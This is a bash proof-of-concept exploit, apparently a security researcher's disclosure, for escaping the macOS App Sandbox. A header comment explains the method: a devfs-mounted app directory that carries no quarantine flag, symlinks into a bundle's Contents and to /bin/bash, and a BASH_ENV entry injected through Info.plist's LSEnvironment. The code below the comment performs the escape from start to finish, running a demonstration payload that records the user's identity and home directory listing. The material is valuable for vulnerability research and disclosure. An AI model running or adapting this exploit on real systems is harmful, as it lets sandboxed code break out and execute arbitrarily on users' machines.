#!/bin/bash
#
# Universal App Sandbox Escape by Gergely Kalman (@gergely_kalman), 2022-12-05
# 
# Controlling environment variables via the `open` command and corresponding
# system APIs seem no longer possible, so I had to find a way to do reliable
# sandbox escaping.
#
# Luckily `open` still opens .app folders as app bundles and only a few checks
# are done to make sure it is an authentic app.
#
# The main protection against running arbitrary code is the quarantine flag
# (com.apple.quarantine), that is placed on new files and folders created
# by the app running inside the sandbox.
#
# We can sidestep this protection easily, since this flag is only checked in
# two places on an application bundle.
# 1) The top level `MyScript.app` directory
# 2) The actual executable `MyScript.app/Contents/MacOS/applet`
#
# On execution `open` tries to open the directory as an app bundle if it's
# in the form of "XXX.YYY", for any XXX and YYY pretty much, with the
# exception of things that are handled by other apps. `Test.png` won't
# work for example but `Test.pngwhatever` would.
#
# First we start by using osacompile to create a "scaffold" application for
# us. The payload is not important.
#
# Second we need to create an unquarantined directory of the form `XXX.YYY`.
# For this I will use devfs since devfs does not allow setting any extended
# attributes. We can't write files on devfs though, but it does allow us to
# create directories and symlinks. We'll create "target.app" and symlink
# "target.app/Contents" to our real app's Contents directory. This bypasses
# protection #1, the quarantine flag check on top level directory.
# 
# For #2, the quarantine flag check on the executable itself, symlinks can be
# used. Symlinks will not have the exended attribute set on them, so we can
# point to any executable. The symlinks will be followed without problems. I
# chose /bin/bash as a target in place of our `applet`. I could have picked
# any executable, but bash has no `Info.plist` which could get cached by the
# system. We will rely on this property later. This defeats protection #2.
#
# Since now we arrived at a place where we can run any application we want
# from a controlled bundle we can modify `Info.plist` arbitrarily which will
# go unnoticed by the system. This file has very useful functionalities for
# an attacker. For now I will use `LSEnvironment`, which sets environment
# variables at launch time. Perhaps other settings could be used to subvert
# program execution as well, but for now this is enough.
#
# With this final step we can now execute any system binary we want with
# any environment variable set to any value. This trivially lets us run
# arbitrary code outside our sandbox by leveraging `BASH_ENV` in the case of
# bash, or we could use this directly to attack another system application
# via environments.
# 
# Some quick prevention ideas:
# - Prevent symlinks in app Bundles
#   - Likely breaks compatibility
# - Verify quarantine flags on EVERY FILE in the bundle.
#   - This is prone to races however
# - Restrict LSEnvironment usage when ran from sandbox
#   - Plenty of attack surface left in Info.plist, races, etc...
#
#
# Gergely Kalman, 2022-12-05
#
# EOF

MNT="mnt"
EXPL_BASEDIR="EXPL_BASEDIR"
SRC_APP="baseapp.app"
DST_APP="$MNT/final.app"
TARGET_BINARY="/bin/bash"
PAYLOAD_FILE="$TMPDIR/payload.sh"
# this payload will run outside the sandbox, so using ~ is fine
PAYLOAD_CMD=$(cat<<EOF
rm ~/Desktop/pwned
(
 echo "date:"
 date
 echo "whoami:"
 whoami
 echo "id:"
 id
 echo "ls -al ~/:"
 ls -al ~/
) > ~/Desktop/pwned
EOF
)

echo "[+] Creating EXPL_BASEDIR"
PREVDIR=$(pwd)
rm -rf "$EXPL_BASEDIR" 2>/dev/null
mkdir -p "$EXPL_BASEDIR"
cd "$EXPL_BASEDIR"
pwd

echo "[+] Creating our payload"
rm -rf "$SRC_APP"
# this can be ignored: ".: replacing existing signature"
osacompile -o "$SRC_APP" -e "do shell script \"ls\""

echo "[+] Mounting devfs to create appdir"
mkdir -p "$MNT"
mount_devfs -o noowners none "$MNT"
chmod 777 "$MNT"
mkdir "$DST_APP"
ln -sf "$(pwd)/$SRC_APP/Contents" "$DST_APP"

echo "[+] Modifying our payload's applet file"
ln -sf "$TARGET_BINARY" "$SRC_APP/Contents/MacOS/applet"

echo "[+] Writing payload to \"$PAYLOAD_FILE\""
rm "$PAYLOAD_FILE"
echo -en "$PAYLOAD_CMD" > "$PAYLOAD_FILE"

echo "[+] Modifying Info.plist"
# add LSEnvironment settings to Info.plist via an ugly sed
sed -I ".backup" s,"^</dict>$","\t<key>LSEnvironment</key>\n\t<dict>\n\t\t<key>BASH\_ENV</key>\n\t\t<string>$PAYLOAD_FILE</string>\n\t<\/dict>\n<\/dict>",g "$SRC_APP/Contents/Info.plist"
sync

echo "[+] Executing payload"
open "$DST_APP"
sleep 1

if [ -f ~/Desktop/pwned ]
then
	echo "SUCCESS! We are done :)"
else
	echo "FAILED to place ~/Desktop/pwned file :(, run me again!"
fi

echo "[+] Cleaning up"
umount "$MNT"
cd "$PREVDIR"
rm -rf "$EXPL_BASEDIR"

echo "[+] Done"
ls -al ~/Desktop/pwned

